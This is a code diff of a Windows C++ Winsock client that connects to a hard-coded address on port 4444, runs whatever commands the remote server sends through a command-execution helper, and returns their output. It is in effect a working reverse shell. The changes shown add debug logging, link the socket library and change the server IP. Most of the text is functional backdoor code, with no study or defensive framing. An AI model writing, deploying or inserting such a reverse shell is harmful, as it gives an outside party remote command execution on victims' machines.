@@ -1,14 +1,3 @@
-/*
-Client Functions
-1. initialize WSA - WSAStartup()
-2. Create a socket - socket()
-3. Define Server address
-4. Connect to server - connect()
-5. send and receive data - recv(), send(), recvfrom(),sendto()
-6. Disconect - closesocket()
-*/
-
-#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <winsock2.h>
 #include <windows.h>
 #include <iostream>
@@ -16,6 +5,7 @@ Client Functions
 #include <sstream>
 #include <stdio.h>
 
+#pragma comment(lib, "ws2_32.lib")
 
 std::string execCommand(const std::string& cmd) {
     char buffer[128];
@@ -33,34 +23,39 @@ std::string execCommand(const std::string& cmd) {
 }
 
 int main() {
-    // 1. Initialize Winsock
+    std::cerr << "[*] Starting client\n";
+
     WSADATA wsaData;
     int wsInit = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (wsInit != 0) {
+        std::cerr << "[!] WSAStartup failed: " << wsInit << "\n";
         return 1;
     }
+    std::cerr << "[*] WSA initialized\n";
 
-    // 2. Create socket
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
+        std::cerr << "[!] Socket creation failed: " << WSAGetLastError() << "\n";
         WSACleanup();
         return 1;
     }
+    std::cerr << "[*] Socket created\n";
 
-    // 3. Define server address
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(4444);
-    serverAddr.sin_addr.s_addr = inet_addr("192.168.56.1");  // Change to your server IP
+    serverAddr.sin_addr.s_addr = inet_addr("192.168.0.103");  // CHANGE IF NEEDED
 
-    // 4. Connect to server
-    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+    std::cerr << "[*] Attempting to connect...\n";
+    int connectionResult = connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr));
+    if (connectionResult == SOCKET_ERROR) {
+        std::cerr << "[!] Connect failed: " << WSAGetLastError() << "\n";
         closesocket(sock);
         WSACleanup();
         return 1;
     }
+    std::cerr << "[+] Connected to server\n";
 
-    // 5. Receive and execute commands
     char buffer[4096];
     std::string output;
 
@@ -79,7 +74,6 @@ int main() {
         send(sock, output.c_str(), output.size() + 1, 0);
     }
 
-    // 6. Cleanup
     closesocket(sock);
     WSACleanup();
     return 0;
